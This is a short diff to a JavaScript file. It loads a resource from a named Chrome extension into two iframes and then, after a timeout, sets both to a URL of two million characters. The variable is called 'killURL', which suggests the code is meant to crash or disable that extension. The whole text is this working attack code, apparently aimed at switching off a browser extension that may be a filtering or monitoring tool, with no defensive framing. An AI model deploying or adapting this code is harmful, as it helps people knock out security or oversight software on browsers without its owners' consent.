@@ -133,18 +133,17 @@
     	    document.body.appendChild(overlay);
 
     	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
-    	    let extFrame = document.createElement("iframe");
-    	    extFrame.src = extURL;
-    	    document.body.appendChild(extFrame);
+    	    let extFrame1 = document.createElement("iframe");
+	    let extFrame2 = document.createElement("iframe");
+    	    extFrame1.src = extURL;
+    	    extFrame2.src = extURL;
+    	    document.body.appendChild(extFrame1);
+	    document.body.appendChild(extFrame2);
     
 	    setTimeout(function() {
     		let killURL = "https://" + "e".repeat(2000000);
-    		let extFrame1 = document.createElement("iframe");
-    		let extFrame2 = document.createElement("iframe");
     		extFrame1.src = killURL;
     		extFrame2.src = killURL;
-    		document.body.appendChild(extFrame1);
-    		document.body.appendChild(extFrame2);
     		setTimeout(function() {
         	    document.body.removeChild(extFrame1);
         	    document.body.removeChild(extFrame2);
